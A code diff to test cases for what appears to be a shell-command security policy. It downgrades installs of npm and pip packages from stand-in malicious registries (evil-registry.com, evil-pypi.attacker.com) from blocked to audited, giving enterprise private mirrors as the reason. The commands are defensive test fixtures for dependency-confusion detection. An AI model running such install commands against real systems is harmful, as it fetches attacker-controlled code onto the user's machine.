@@ -28,27 +28,27 @@ var NonStandardRegistryCases = []TestCase{
 	{
 		ID:               "FN-NSREG-001",
 		Command:          `npm install --registry https://evil-registry.com lodash`,
-		ExpectedDecision: "BLOCK",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TP",
 		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
 		Analyzer:         "regex",
-		Description: `npm install with non-standard registry override. The base policy
-			audit-package-installs fires (AUDIT) and the supply-chain pack's
-			sc-block-npm-registry-override fires (BLOCK). The most_restrictive_wins
-			combiner returns BLOCK, so there is no ordering shadow issue.`,
+		Description: `npm install with non-standard registry override. Downgraded to AUDIT
+			to support enterprise private registries (Artifactory, Nexus, Verdaccio).
+			sc-block-npm-registry-override fires (AUDIT). External URLs still flagged
+			for human review.`,
 		Tags: []string{"canonical", "critical"},
 	},
 	{
 		ID:               "FN-NSREG-002",
 		Command:          `pip install --extra-index-url https://evil.com/simple/ package`,
-		ExpectedDecision: "BLOCK",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TP",
 		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
 		Analyzer:         "structural",
 		Description: `pip install with extra-index-url pointing to a malicious host.
-			sc-block-pip-extra-index (BLOCK) fires via structural rule (executable=pip,
-			subcommand=install, flags_any=[extra-index-url]). most_restrictive_wins
-			combiner returns BLOCK. --extra-index-url enables dependency confusion attacks.`,
+			Downgraded to AUDIT to support enterprise private PyPI mirrors.
+			sc-block-pip-extra-index fires (AUDIT). External URLs still flagged
+			for human review.`,
 		Tags: []string{"critical"},
 	},
 	{
@@ -1001,7 +1001,7 @@ var PipIndexURLCases = []TestCase{
 	{
 		ID:               "TP-SC-BLOCK-PIPIDX-001",
 		Command:          `pip install requests --index-url https://evil-pypi.attacker.com/simple/`,
-		ExpectedDecision: "BLOCK",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TP",
 		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
 		Analyzer:         "structural",
@@ -1011,7 +1011,7 @@ var PipIndexURLCases = []TestCase{
 	{
 		ID:               "TP-SC-BLOCK-PIPIDX-002",
 		Command:          `pip3 install -r requirements.txt --index-url http://internal.corp.local/pypi/`,
-		ExpectedDecision: "BLOCK",
+		ExpectedDecision: "AUDIT",
 		Classification:   "TP",
 		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
 		Analyzer:         "structural",
